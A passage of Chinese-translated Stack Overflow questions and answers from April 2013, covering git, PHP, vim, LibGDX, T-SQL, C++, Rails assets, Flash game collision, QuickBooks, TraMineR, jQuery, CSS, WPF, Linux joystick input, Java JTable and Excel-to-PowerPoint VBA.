git remote add upstream git://github.com/antirez/redis.git 
```

该`name`部分只是 [您选择的名称，](http://kernel.org/pub/software/scm/git/docs/git-remote.html) 以便于参考。

```
 Adds a remote named <name> for the repository at <url>. The command
    git fetch <name> can then be used to create and update
    remote-tracking branches <name>/<branch>. 
```

# php - 如何检查通过调用 facebook 的 api 获得的文件是否真的是图像？

> ID：16110478
> 
> 赞同：0
> 
> 时间：2013-04-19T17:40:04.323
> 
> 标签：php, image, facebook-graph-api, twitter

我调用了 facebook 的图形 API 并检索了一张图片。现在我想检查来自呼叫的图像是否真的是图像文件。我为一个简单的图像检查功能编写了代码。如何将 url 传递给`$path`变量。我也将重用此代码来检查来自 Twitter 的图像。

```
function is_image($path)
  {
$a = getimagesize($path);
$image_type = $a[2];

if(in_array($image_type , array(IMAGETYPE_GIF , IMAGETYPE_JPEG ,IMAGETYPE_PNG , IMAGETYPE_BMP)))
{
    return true;
}
return false; 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T20:28:55.613

对于 facebook api 案例，您可以简单地发出**HTTP HEAD 请求** [http://graph.facebook.com/USER_ID/picture?size=original ，然后如果 http_code 是](http://graph.facebook.com/USER_ID/picture?size=original)**HTTP/1.1 302 Found**它应该是一个图像

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:45:02.840

运行[`getimagesize()`](http://php.net/manual/en/function.getimagesize.php)它 - 如果它返回值，那么它是一个图像。**

# vim - vim 中的这个历史窗口叫什么？

> ID：16110480
> 
> 赞同：6
> 
> 时间：2013-04-19T17:40:15.607
> 
> 标签：vim, misspelling

有时当我执行 vim 命令时，会突然出现类似窗口的历史记录。任何人都知道它的作用，它的名称以及如何使其出现？

![维姆](https://i.stack.imgur.com/vrUlC.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-19T17:43:28.547

它被称为命令行窗口

```
:h command-line-window 
```

您可以`<c-f>`在提示符下或`q:`正常模式下通过

```
:h q: 
```

# android - LibGDX 和 ObjLoader 不显示 .mtl？

> ID：16110482
> 
> 赞同：7
> 
> 时间：2013-04-19T17:40:24.633
> 
> 标签：android, opengl-es, libgdx, wavefront

我正在尝试使用 LibGDX 将 .obj 文件加载到 Android 项目中。这些文件*没有*纹理文件，但在 .mtl 文件中包含材质。我正在使用最新的官方每晚，并且渲染目标文件只会导致对象显示为白色。如何让 ObjLoader 使用 .mtl 文件？

```
@Override
public void create() {
    objLoader = new ObjLoader();
    model = objLoader.loadObj( Gdx.files.internal("data/obj.obj"), true);
}

@Override
public void render() {
    Gdx.gl.glClearColor(0, 0, 0, 0);
    Gdx.gl.glClear(GL10.GL_COLOR_BUFFER_BIT);
    batch.begin();

    model.render();

    batch.end();
} 
```

这就是调用渲染对象的代码的方式。这是 ObjLoader 类的链接

[https://github.com/libgdx/libgdx/blob/master/gdx/src/com/badlogic/gdx/graphics/g3d/loaders/wavefront/ObjLoader.java](https://github.com/libgdx/libgdx/blob/master/gdx/src/com/badlogic/gdx/graphics/g3d/loaders/wavefront/ObjLoader.java)

我究竟做错了什么？为什么它不会加载 .mtl 文件？据我了解，它应该加载与 .obj 文件位于同一文件夹中且名称相同的 .mtl 文件。

**编辑** 我有点搞砸了，在 ObjLoader 类中添加了一些行来记录它是什么，没有加载。看起来它正在加载 mtl 文件，并将每个 mtl 分配给一个 Material 实例，而且看起来 obj 正在正确地请求这些材料。

我需要在 OpenGL 端启用或以其他方式执行某些操作以确保它正确使用这些材料吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-23T01:30:45.697

ObjLoader 尤其是它使用的 MtlLoader 非常有限。尝试将新的 3D api 与 fbx 一起使用。这里解释了如何加载模型：[http](http://blog.xoppa.com/loading-models-using-libgdx/) ://blog.xoppa.com/loading-models-using-libgdx/ 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-01T18:23:13.463

我发现了同样的问题，这正是我都在这里报告的原因：

[https://github.com/libgdx/libgdx/issues/2441](https://github.com/libgdx/libgdx/issues/2441)

并在这里对其进行了修复：

[https://github.com/libgdx/libgdx/commit/d7e716351d26ddfba19ce9e0b3bdfb449dbc81b7](https://github.com/libgdx/libgdx/commit/d7e716351d26ddfba19ce9e0b3bdfb449dbc81b7)

，支持几乎所有的 MTL 参数。请注意，这是一个 WIP，并且（希望）一旦完成就会进入主干。

# c# - 如何根据 CASE 语句返回数据库结果？

> ID：16110487
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:40:35.013
> 
> 标签：c#, tsql, sql-server-2000

我现在有一个应用程序，它具有硬连线到可执行文件中的特殊用户角色。它是防篡改的，但在涉及新员工、角色变更等时有点混乱。

所以，我想创建一个存储过程，它可以为任何给定的操作返回适当的员工徽章编号。

我的专长是 C# 开发，但我也是 SQL Server (2000) 数据库的工作人员。

这是我开始的，但 T-SQL 根本不喜欢这个！

```
CREATE PROCEDURE sp1_GetApprovalBadges(@operation varchar(50)) as
BEGIN
    -- SET NOCOUNT ON added to prevent extra result sets from interfering with SELECT statements.
    SET NOCOUNT ON;
  declare @op varchar(50); 
  declare @num varchar(50); 
  declare @table table (NUM varchar(50) null);

  select @op=upper(@operation);
  case
    when @op='CLERK' then
      insert into @table (NUM) values (@num) where @num in ('000988','001508','003790','007912') end
    when @op='HRMANAGER' then
      insert into @table (NUM) values (@num) where @num in ('003035') end
    when @op='HUMANRESOURCES' then
      insert into @table (NUM) values (@num) where @num in ('002864','005491') end
    when @op='INFORMATIONTECHNOLOGY' then
      insert into @table (NUM) values (@num) where @num in ('001258','003423','007135','007546') end
    end;
    SELECT NUM from @table order by NUM;
END
GO 
```

我意识到这与我编写的代码非常相似，并且与数据库无关，但是拥有数据库为我提供了一种存储和执行一些脚本的好方法，我可以根据需要修改这些脚本以保持我的应用程序正常工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:55:27.530

我看到至少两个问题

1.  用 if else 替换大小写
2.  使用动态 sql 执行表变量

例如

```
if @op='CLERK'
  begin
      exec 'insert into ' + @table + '(NUM) values (' + @num + ') where' + @num + 'in    (''000988'',''001508',''003790',''007912'')' 
  end
  else if @op='HRMANAGER'
  begin
      i-- see above
  end
  else if @op='HUMANRESOURCES'
  begin
    -- see above
  end
  else if @op='INFORMATIONTECHNOLOGY'
  begin
      -- see above
  end

  exec 'SELECT NUM from' + @table + 'order by NUM;' 
```

语法可能不准确，但这个想法会奏效

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:54:54.550

`CASE`是一个返回单个值的表达式。您不能像您尝试的那样将它用于控制流逻辑。根据条件（硬编码的字符串集），您可能的意思是这样的（用您尝试的语法悄悄地解决其他几个问题）：

```
 ... 

  SELECT @op=upper(@operation);

  IF @op = 'CLERK'
  BEGIN
      INSERT @table (NUM) 
        SELECT '000988'
        UNION ALL SELECT '001508'
        UNION ALL SELECT '003790'
        UNION ALL SELECT '007912';
  END

  IF @op = 'HRMANAGER'
  BEGIN
      INSERT @table (NUM) 
        SELECT '003035';
  END

  IF @op = 'HUMANRESOURCES'
  BEGIN
      INSERT @table (NUM) 
        SELECT '002864'
        UNION ALL SELECT '005491';
  END

  IF @op = 'INFORMATIONTECHNOLOGY'
  BEGIN
       INSERT @table (NUM) 
         SELECT '001258'
         UNION ALL SELECT '003423'
         UNION ALL SELECT '007135'
         UNION ALL SELECT '007546'
  END

  SELECT NUM from @table order by NUM;

  ... 
```

# c++ - ']' 之前的主要表达式错误含义

> ID：16110490
> 
> 赞同：1
> 
> 时间：2013-04-19T17:40:48.277
> 
> 标签：c++, syntax-error

我正在尝试修复有错误的代码，但还有一个错误我无法弄清楚。错误说： ']' 标记之前的预期主表达式，这是什么意思？我检查了放错位置的分号和变量名，但找不到任何东西。这是我的代码（我已经用错误注释了该行）：

```
// countOnes.cpp
#include<iostream>
#include<cstdlib>
using namespace std;

void countOnes( int array[] ); // Count the number of 1s in a given int array.
const int arraySize = 10;
int array[ arraySize ];
int countOne = 0;

int main()
{
  for ( int i = 0; i <= arraySize; i++ )
  {
    array[ i ] = rand() % 3;  // Fill array with 0, 1 or 2 randomly
    cout << array[ i ] << " ";
  }
  countOnes( array[], arraySize ); //ERROR

  cout << "\n The number of 1s in the array: " << countOne;

  return 0;
}

void countOnes( int array[], int arraySize )
{
  for ( int i = 0; i <= arraySize; i++ )
    if ( array[ i ] == 1 )
      countOne = countOne + 1;
  return;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T17:42:10.787

不需要方括号。

```
`countOnes(array~~[]~~, arraySize);` 
```

* * *

 `## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T17:43:32.637

```
countOnes( array[], arraySize ); //ERROR 
```

你不需要 [] 这里
也声明

```
void countOnes( int array[] ); // Count the number of 1s in a given int array. 
```

不符合其定义

```
void countOnes( int array[], int arraySize ) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T17:52:37.713

'array' 在 Microsoft 的 C 扩展中被视为保留字。请参阅[为什么在 Visual-C++ 中将“array”标记为保留字？](https://stackoverflow.com/questions/372580/why-is-array-a-reserved-word-in-c-c). 将“array”替换为其他内容，例如“arr”。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-19T17:43:46.127

如果要传递数组，可以将指向第一个元素的指针传递给数组：

```
 void countOnes( int* array, int size ); 
````

# turing-complete - 图灵机能否决定一个正式的计算模型是否是图灵完备的？

> ID：16110493
> 
> 赞同：0
> 
> 时间：2013-04-19T17:41:05.853
> 
> 标签：turing-complete, halting-problem, computability

也就是说，图灵机能否将形式系统 S 作为其输入并确定 S 是否是图灵完备的？

我认为这是一个无法确定的问题，对吗？

如果它是不可判定的，为什么我们（作为人类）可以决定图灵完备性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-15T10:01:00.860

嗯 :-) 决定图灵完整性并不是确定人脑是否是 TM 完整的核心；可以通过机械步骤来确定图灵完整性；这不是问题。

关键问题是，人脑是超计算[1]还是超图灵。

一项测试是对以下问题之一回答“是”：人类能否预测图灵机何时停止？（即解决停机问题）或者是人脑不受赖斯定理的约束。

在一般情况下，这两个问题的答案似乎都是“否”，因为人们可以想象一个带有无限长磁带的 TM 并且只是四处跳动，我们永远无法判断它何时会碰到一个告诉它停止的单元格。

表面上的超计算能力来自于我们将普通计算机/软件/机械过程等误认为 TM 的事实。

赖斯定理可以在具有马尔可夫性质并且具有有限数量的位置转移网络表示的系统的“特殊情况”中被回避。我们的一般环境有大量的这些“特殊情况”，所以看起来人脑似乎能够进行超计算，因为它倾向于从特殊情况下得出一般结论，但可能不是，因为我们人类还没有体验与图灵机的交互。

# javascript - Javascript 在 dev 中有效，但在 prod 中无效。寻求建议

> ID：16110496
> 
> 赞同：0
> 
> 时间：2013-04-19T17:41:26.333
> 
> 标签：javascript, css, ruby-on-rails

我所有的 js 和 css 都在 dev 中工作，但不是 prod。我已经解决这个问题2周了。请指教。特别是提前输入下拉菜单不起作用。我已经尝试了很多重新排序等，但如果你看到了什么，请告诉我。我试过预编译而不是预编译。我尝试更改配置文件的值。

布局/application.html.erb：

```
<%= stylesheet_link_tag    "application" %>
<%= javascript_include_tag "application" %> 
```

生产.rb：

```
myApp::Application.configure do

  # Settings specified here will take precedence over those in config/application.rb

  # Code is not reloaded between requests
  config.cache_classes = true

  # Full error reports are disabled and caching is turned on
  config.consider_all_requests_local = false
  #default false ^^
  config.action_controller.perform_caching = true

  # Disable Rails's static asset server (Apache or nginx will already do this)
  config.serve_static_assets = true
  #defualt false

  # Compress JavaScripts and CSS
  config.assets.compress = true
  #defualt true

  # Don't fallback to assets pipeline if a precompiled asset is missed
  config.assets.compile = true
  #default = false

  # Generate digests for assets URLs
  config.assets.digest = true

  # Defaults to nil and saved in location specified by config.assets.prefix
  # config.assets.manifest = YOUR_PATH

  # Specifies the header that your server uses for sending files
  # config.action_dispatch.x_sendfile_header = "X-Sendfile" # for apache
  # config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for nginx

  # Force all access to the app over SSL, use Strict-Transport-Security, and use secure cookies.
  # config.force_ssl = true

  # See everything in the log (default is :info)
  # config.log_level = :debug

  # Prepend all log lines with the following tags
  # config.log_tags = [ :subdomain, :uuid ]

  # Use a different logger for distributed setups
  # config.logger = ActiveSupport::TaggedLogging.new(SyslogLogger.new)

  # Use a different cache store in production
  # config.cache_store = :mem_cache_store

  # Enable serving of images, stylesheets, and JavaScripts from an asset server
  # config.action_controller.asset_host = "http://assets.example.com"

  # Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)
  # config.assets.precompile += %w( search.js )
  config.assets.precompile += %w( jquery.js )
  config.assets.precompile += %w( jquery_ujs.js )
  config.assets.precompile += %w( jquery-ui-1.10.2.custom.js )
  config.assets.precompile += %w( twitter/bootstrap.js )
  config.assets.precompile += %w( bootstrap-typeahead.js )
  config.assets.precompile += %w( rails.js )
  config.assets.precompile += %w( autocomplete-rails.js )

  # Disable delivery errors, bad email addresses will be ignored
  # config.action_mailer.raise_delivery_errors = false

  # Enable threaded mode
  # config.threadsafe!

  # Enable locale fallbacks for I18n (makes lookups for any locale fall back to
  # the I18n.default_locale when a translation can not be found)
  config.i18n.fallbacks = true

  # Send deprecation notices to registered listeners
  config.active_support.deprecation = :notify

  # Log the query plan for queries taking more than this (works
  # with SQLite, MySQL, and PostgreSQL)
  # config.active_record.auto_explain_threshold_in_seconds = 0.5
end 
```

应用程序/资产/application.js：

```
// This is a manifest file that'll be compiled into including all the files listed below.
// Add new JavaScript/Coffee code in separate files in this directory and they'll automatically
// be included in the compiled file accessible from http://example.com/assets/application.js
// It's not advisable to add code directly here, but if you do, it'll appear at the bottom of the
// the compiled file.
//

//= require jquery
//= require jquery_ujs
//= require jquery-ui-1.10.2.custom.min
//= require twitter/bootstrap
//= require highcharts
//= require highcharts/modules/canvas-tools
//= require highcharts/modules/exporting
//= require bootstrap-typeahead
//= require rails
//= require autocomplete-rails
//= require_tree .

$(document).ready(function()     {
    $('.dropdown-toggle').dropdown();
} );

$(document).ready(function() {
    $('.popover-myasset').popover();
}); 
```

# actionscript-3 - Flash 碰撞检测（平台游戏）

> ID：16110504
> 
> 赞同：0
> 
> 时间：2013-04-19T17:41:58.717
> 
> 标签：actionscript-3, flash, collision-detection, game-physics, rectangles

我正在尝试使用 ActionScript 3 在 Flash 中制作平台游戏。目前一切正常，除了一件事。

问题：

当玩家与平台底部发生碰撞时，如果他的 xVel 不等于 0，则调用水平碰撞检测循环，让玩家水平和垂直移动。这意味着他从平台下方反弹，但也被转移到平台的一侧。如果玩家的 xVel 等于 0，则一切正常。这是因为没有调用水平碰撞循环。我无法弄清楚为什么会这样。任何帮助将不胜感激。

编码：

```
import flash.events.Event;
import flash.geom.Rectangle;

var level:Array = new Array();

var xVel = 0;
var yVel = 0;

var xSpeed = 15;

var accel =1.5;
var grav = 2;
var jumpHeight = 15*grav;

for(var i = 0; i<numChildren;i++){
    if(getChildAt(i) is platform){
        level.push(getChildAt(i).getRect(this));
    }   
}

var upKeyDown = false;
var leftKeyDown = false;
var rightKeyDown = false;
var downKeyDown = false;

stage.addEventListener(KeyboardEvent.KEY_DOWN,keyDown);
stage.addEventListener(KeyboardEvent.KEY_UP,keyUp);
stage.addEventListener(Event.ENTER_FRAME,gameLoop);

function keyDown(e:KeyboardEvent){
    if(e.keyCode == Keyboard.UP){
        upKeyDown = true;
    }   
    if(e.keyCode == Keyboard.LEFT){
        leftKeyDown = true;
    }   
    if(e.keyCode == Keyboard.RIGHT){
        rightKeyDown = true;
    }   
    if(e.keyCode == Keyboard.DOWN){
        downKeyDown = true;
    }   
}
function keyUp(e:KeyboardEvent){
    if(e.keyCode == Keyboard.UP){
        upKeyDown = false;
    }   
    if(e.keyCode == Keyboard.LEFT){
        leftKeyDown = false;
    }   
    if(e.keyCode == Keyboard.RIGHT){
        rightKeyDown = false;
    }   
    if(e.keyCode == Keyboard.DOWN){
        downKeyDown = false;
    }   
}

function gameLoop(e:Event){
    if(rightKeyDown){
        if(xVel<xSpeed){
            xVel+=accel;
        }

    }else if(leftKeyDown){
        if(xVel>-xSpeed){
            xVel-=accel;
        }

    }else{
        xVel *=0.6;
    }
    //horizontal
    player.x+=xVel;
    for(i = 0; i<level.length;i++){
        if(player.getRect(this).intersects(level[i])){
            if(xVel>0){
                player.x = level[i].left-player.width/2;
            }
            if(xVel<0){
                player.x = level[i].right+player.width/2;
            }
            xVel = 0;
        }
    }

    yVel+=grav;
    player.y+=yVel;
    var jumpable = false;
    for(i = 0; i<level.length;i++){
        if(player.getRect(this).intersects(level[i])){
            if(yVel>0){
                player.y = level[i].top-player.height/2;
                yVel = 0;
                jumpable = true;
            }
            if(yVel<0){
                player.y = level[i].bottom+player.height/2;
                yVel*=-0.5;
            }
        }
    }
    if(upKeyDown&&jumpable){
        jump();
    }
    this.x = -player.x+(stage.stageWidth/2);
    this.y = -player.y+(stage.stageHeight/2);
}

function jump(){
    yVel-=jumpHeight;   
} 
```

**我认为**问题发生的地方

```
player.x+=xVel;
    for(i = 0; i<level.length;i++){
        if(player.getRect(this).intersects(level[i])){
            if(xVel>0){
                player.x = level[i].left-player.width/2;
            }
            if(xVel<0){
                player.x = level[i].right+player.width/2;
            }
            xVel = 0;
        }
    }

    yVel+=grav;
    player.y+=yVel;
    var jumpable = false;
    for(i = 0; i<level.length;i++){
        if(player.getRect(this).intersects(level[i])){
            if(yVel>0){
                player.y = level[i].top-player.height/2;
                yVel = 0;
                jumpable = true;
            }
            if(yVel<0){
                player.y = level[i].bottom+player.height/2;
                yVel*=-0.5;
            }
        }
    } 
```

图片！

![视觉描述](https://i.stack.imgur.com/Z6DFN.png)

额外的信息：

平台是影片剪辑符号，都源自同一个符号。它们被拖到画布上并调整大小。平台符号有一个称为“平台”的 AS 链接，这是代码中如何将子标识为平台的方式

播放器是一个没有动画的矩形

平台和玩家在对象的中心都有一个方向。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:54:09.020

您需要先测试天花板碰撞并在水平检查之前进行相应调整。如果你不这样做，那么当你进行水平检查时，你的玩家正在与平台底部发生碰撞。

# quickbooks - 使用 getcurrentcompanyfilename 的集成应用程序导致错误

> ID：16110505
> 
> 赞同：2
> 
> 时间：2013-04-19T17:41:58.927
> 
> 标签：quickbooks, intuit-partner-platform, qbxml

我用

```
qbxmlrp.getcurrentcompanyfilename 
```

（使用 qbxmlrp2）在 QB 2011、2012 和 2013 中（有时）我收到错误 2147220470 和消息“QuickBooks 已打开并且文件与请求的文件不同，或者有多个 QuickBooks 实例正在运行。”

一些用户报告了通过 Windows 资源管理器同时打开多个 QB 文件后开始出现的错误。

这是因为使用Windows资源管理器直接打开.qbw文件吗？如何克服或围绕它编码？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T11:53:46.913

这个错误：

> QuickBooks 已经打开并且文件与请求的文件不同，或者有多个 QuickBooks 实例正在运行。

几乎可以准确地解释问题所在。由于 QuickBooks 本身的设计方式，API/SDK 连接在以下情况下*不起作用*：

*   您的应用尝试打开不同于已打开的 QuickBooks 文件
*   一次打开多个 QuickBooks 公司文件

没有变通方法，这是 QuickBooks 本身的限制。

如果您的应用程序需要与 QuickBooks 通信，则最终用户需要没有打开*任何*QuickBooks 公司文件，或者*您尝试连接以*打开的公司文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T18:06:00.143

问题是为错误文件名返回的错误号与运行多个 QuickBooks 实例时返回的错误号相同 - 我不知道哪个正在发生。将此与 Win7 的路径别名结合起来，有时会间歇性地更改，您会感到困惑和复杂的错误处理代码要求。简而言之，如果其他人需要存储链接的 QB 文件的文件和路径，我建议允许别名。

# r - 从 SPELL 数据创建序列对象

> ID：16110508
> 
> 赞同：6
> 
> 时间：2013-04-19T16:35:41.260
> 
> 标签：r, traminer

我正在尝试`seqdef`使用 SPELL 格式创建一个序列对象。这是我的数据示例：

```
spell <- structure(list(ID = c(1, 3, 3, 4, 5, 5, 6, 8, 9, 10, 11, 11, 
12, 13, 13, 13, 13, 14, 14, 14, 14, 14, 14, 14, 14, 14, 15, 15, 
15, 15, 15, 15, 15, 16, 16, 16, 16, 17, 17, 17, 18, 18, 18, 19, 
19), status = c(1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 
1, 1, 2, 3, 1, 2, 3, 2, 3, 1, 1, 1, 3, 1, 3, 3, 1, 3, 1, 1, 1, 
1, 1, 3, 3, 1, 3, 1, 1, 1), time1 = c(1, 1, 57, 1, 1, 91, 1, 
1, 1, 1, 1, 104, 1, 1, 60, 109, 121, 1, 42, 47, 54, 64, 72, 78, 
85, 116, 1, 29, 39, 69, 74, 78, 88, 1, 16, 40, 68, 1, 30, 123, 
1, 39, 51, 1, 61), time2 = c(125, 57, 125, 125, 91, 125, 125, 
125, 125, 125, 104, 125, 125, 60, 109, 121, 125, 42, 47, 54, 
64, 72, 78, 85, 116, 125, 29, 39, 69, 74, 78, 88, 125, 16, 40, 
68, 125, 30, 123, 125, 39, 51, 125, 61, 125)), .Names = c("ID", 
"status", "time1", "time2"), row.names = c(NA, 45L), class = "data.frame") 
```

当我尝试定义序列对象时，会抛出一个奇怪的错误：

```
spell.seq <- seqdef(data=spell, informat="SPELL", id="ID", begin="time1", end="time2", 
                    status="status", limit=125,process=FALSE)

 [>] time axis: 1 -> 125
 [>] SPELL data converted into 17 STS sequences
 [>] 3 distinct states appear in the data: 
     1 = 1
     2 = 2
     3 = 3
 [>] state coding:
       [alphabet]  [label]  [long label] 
     1  1           1        1
     2  2           2        2
     3  3           3        3
 [>] 17 sequences in the data set
 [>] min/max sequence length: 125/125
Error in `row.names<-.data.frame`(`*tmp*`, value = value) : 
  invalid 'row.names' length 
```

但是，如果我通过 间接执行相同的操作`seqformat`，保留相同的参数，则不会引发错误：

```
sts <- seqformat(data=spell,from="SPELL",to="STS",
                 id="ID",begin="time1",end="time2",status="status",
                 limit=125,process=FALSE)

seqs <- seqdef(sts,right="DEL") 
```

将 TraMineR 1.8-5 与 R 3.0.0 Windows 7 64 位一起使用。这是一个错误还是我做错了什么？提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-05-01T04:13:27.790

快速查看`seqdef()`如何`row.names`设置的来源表明它们是基于`id`参数的值设置的。

`?seqdef`正在寻找`id`节目

> id
> 可选参数，用于设置序列对象的行名。**如果为 NULL（默认），则行名取自输入数据。**如果设置为“auto”，则序列从 1 到序列数编号。也可以指定长度等于序列数的行名向量。

从您正在传递的问题中的示例中，`id="ID"`它不符合这些标准。将其更改为`id=NULL`允许命令按预期完成并使用`identical( spell.seq, seqs)`yield检查相等性`true`。

# javascript - 文档准备好时加载用户控件？

> ID：16110510
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:42:11.113
> 
> 标签：javascript, jquery, asp.net, ajax, user-controls

我有一个网页，其中有一个用户控件，它在页面中加载了一个树。问题是，由于用户控件在加载页面的同时加载页面真的很慢。当触发文档就绪事件时，如何在 treee 所在的位置有一个加载轮并使用 jquery 加载用户控件？问题是，我如何知道用户控件何时完成加载，以便我可以移除加载轮并显示树生成的用户控件。

我还缺乏优化用户控件查询的知识，因此该选项被忽略。如果使用准备好的文档是最好的方法，或者是否有更有效的方法，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:04:59.563

我希望这有帮助：

```
$(document).ready(function() {
    showBusyGif();
    $.ajax({
        url:urlToUserControl
        //data:string,
        async:true,
        success: function(result){
            hideBusyGif();
            showUserTree();
        }
    });     
}); 
```

# css - 兄弟跨度相对于彼此定位

> ID：16110513
> 
> 赞同：0
> 
> 时间：2013-04-19T17:42:17.620
> 
> 标签：css

我有两个`span`（s）在 parent 中彼此相邻`div`。

```
<div>
    <span id="x1"> </span>
    <span id="x2"> </span>
</div> 
```

我希望第二个`span`显示在最左边，然后是第一个跨度。（注意：由于某些原因，我不能简单地移动第二个跨度来代替 html 代码中的第一个跨度）。如何在最左边显示第二个跨度？

# 编辑：

`float:left;`在第二个跨度上似乎可以解决问题，但不确定这是否在这种行为方面是跨浏览器一致的！？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:46:34.163

使用`float: left`css。

所有浏览器都支持它。

**HTML**

```
<div><span>Will be leftmost</span><span>Will be right most</span></div> 
```

**CSS**

```
div span {float: left;} 
```

请注意，添加`float`跨度将导致它们不是内联元素，如果这很重要的话。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:46:45.613

这就是诀窍：

```
span#x2 {
    float:left;
} 
```

请参阅[jsfiddle](http://jsfiddle.net/vXNrG/)。

它是跨浏览器的。

# wpf - OnItemsChanged 和项目容器生成之后的事件

> ID：16110514
> 
> 赞同：0
> 
> 时间：2013-04-19T17:42:19.603
> 
> 标签：wpf

`OnItemsChanged`在生成项目容器之后和之后是否发生了事件（或受保护的方法） ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:53:15.487

好的，我会自己回答。我还不知道这是否是一个好的解决方案，但我使用了这样的东西：

```
protected override void OnItemsChanged(NotifyCollectionChangedEventArgs e)
{
    // ... stuff ...

    ItemContainerGenerator.StatusChanged += ItemContainerGenerator_StatusChanged;
}

private void ItemContainerGenerator_StatusChanged(object sender, EventArgs e)
{
    if (ItemContainerGenerator.Status == GeneratorStatus.ContainersGenerated)
    {
        // ... do work here ...

        ItemContainerGenerator.StatusChanged -= ItemContainerGenerator_StatusChanged;
    }
} 
```

它似乎工作...

# linux - input.h 中 input_absinfo 结构中 fuzz 和 flat 的解释

> ID：16110515
> 
> 赞同：4
> 
> 时间：2013-04-19T17:42:20.710
> 
> 标签：linux, input, event-handling, device-driver

我正在尝试使用 input.h 中的 EVIOCSABS 调用来调整不能与 SDL 正常工作的操纵杆的灵敏度。我认为 input_absinfo 结构的 fuzz 和 flat 成员会影响轴的灵敏度，但是在黑暗中拍摄了几次之后，我仍然对它们的工作原理感到困惑。我希望有人能指出我正确的方向。

谢谢你考虑我的问题！这是我在 Joystick 类中编写的代码：

```
int Joystick::configure_absinfo(int axis, int fuzz, int flat)
{
    struct input_absinfo jabsx;
    int result_code = ioctl(joystick_fd, EVIOCGABS(axis), &jabsx);
    if (result_code < 0)
    {
        perror("ioctl GABS failed");
    }
    else
    {
        jabsx.fuzz = fuzz;
        jabsx.flat = flat;

        result_code = ioctl(joystick_fd, EVIOCSABS(axis), &jabsx);
        if (result_code < 0)
        {
            perror("ioctl SABS failed");
        }
    }
    return result_code;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-11T10:05:24.687

关于 fuzz 值，它似乎是用于 abs 输入设备的值。查看 input.h 中 input_absinfo 的文档 [链接到 lxr.linux.no 中的 input.h](http://lxr.linux.no/linux+v3.9.5/include/uapi/linux/input.h#L67)

你可以发现

```
fuzz: specifies fuzz value that is used to filter noise from the event stream. 
```

这意味着如果与最后一个值的差值小于 fuzz，则 linux 中的输入系统将丢弃设备驱动程序生成的事件。这是在输入层完成的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-05-11T13:30:48.060

该`flat`值决定了死区的大小（[来源]）（[https://wiki.archlinux.org/index.php/Gamepad#evdev_API_deadzones](https://wiki.archlinux.org/index.php/Gamepad#evdev_API_deadzones)）。`fuzz`很难找到，但我能找到的最好的是[这些文档](https://github.com/simonfuhrmann/gamepad/blob/master/README.md#linux-support)：

> 过滤（模糊值）：不报告微小变化以减少噪音

因此，似乎任何小于 fuzz 的更改都应该被过滤掉/忽略。

# java - 在java中获取动态复选框的索引

> ID：16110518
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:42:36.497
> 
> 标签：java, dynamic, netbeans, checkbox

我在 jtable 中有动态复选框，我通过这段代码来做

```
 TableColumn tcolumnas = jTable1.getColumnModel().getColumn(3);
 tcolumnas.setCellRenderer(jTable1.getDefaultRenderer(Boolean.class));
 tcolumnas.setCellEditor(jTable1.getDefaultEditor(Boolean.class)); 
```

如果我检查其中一个，我想知道复选框的索引。

听取您的建议

[http://i.stack.imgur.com/tskSw.png](https://i.stack.imgur.com/tskSw.png)

更新 ：

解决方案非常简单，就像这里 [Java Getting JTable Value (Per row)](https://stackoverflow.com/questions/12275011/java-getting-jtable-value-per-row)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:15:11.950

您可以`TableModelListener`在`TableModel`. 每当单元格中的数据发生更改时，都会触发一个事件。

# vba - VBA 错误 438 - 试图将 Excel 图表复制到现有的 Ppt 演示文稿

> ID：16110520
> 
> 赞同：0
> 
> 时间：2013-04-19T17:42:48.720
> 
> 标签：vba, powerpoint

我正在尝试使用 VBA 将图表从 Excel 复制到现有的 Powerpoint 模板。此代码返回错误 438 - 对象不支持此属性或方法：

```
'Create a new Powerpoint session
    Set pptApp = CreateObject("PowerPoint.Application")
    '
    pptApp.Visible = msoTrue
    'Create a new presentation
    Set pptPres = pptApp.Presentations.Open("....potx")
    Set pptPres = pptApp.ActivePresentation
    '
    pptApp.ActiveWindow.ViewType = ppViewSlide
'
    Current_slide = pptPres.Slides.FindBySlideID(258)
    For Each ws In ActiveWorkbook.Worksheets
      'Verify if there is a chart object to transfer
      If ws.ChartObjects.Count > 0 Then
        For Each objChartObject In ws.ChartObjects
          Set objChart = objChartObject.Chart
          'ppLayoutBlank = 12
          Set pptSld = pptPres.Slides.FindBySlideID(Current_slide)
          pptApp.ActiveWindow.View.GotoSlide (pptSld)
          With objChart
           'Copy chart object as picture
            objChart.CopyPicture xlScreen, xlBitmap, xlScreen
            'Paste copied chart picture into new slide
            pptSld.Shapes.Paste.Select
